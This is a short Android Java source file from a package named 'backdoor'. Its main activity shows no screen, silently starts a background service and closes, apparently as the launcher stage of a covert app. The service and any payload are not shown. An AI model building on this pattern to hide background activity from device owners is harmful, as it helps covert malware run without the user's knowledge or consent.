package com.voila.backdoor;

import android.app.*;
import android.content.*;
import android.os.*;
import android.widget.*;
import android.view.View.*;
import android.view.*;
import android.util.*;

public class MainActivity extends Activity
{
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
	{
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.main);
		
		//Toast.makeText(this,"success",1).show();
		Log.i("fuck","MainActivity");
		
		Intent i=new Intent(getApplicationContext(),srv.class);
		//i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		getApplicationContext().startService(i);
		
		/*
		TextView t=(TextView)findViewById(R.id.t);
		t.setOnClickListener(new OnClickListener(){

				@Override
				public void onClick(View p1)
				{
					Log.i("fuck","onClick");
					// TODO: Implement this method
				}
			});*/
		finish();
    }
}
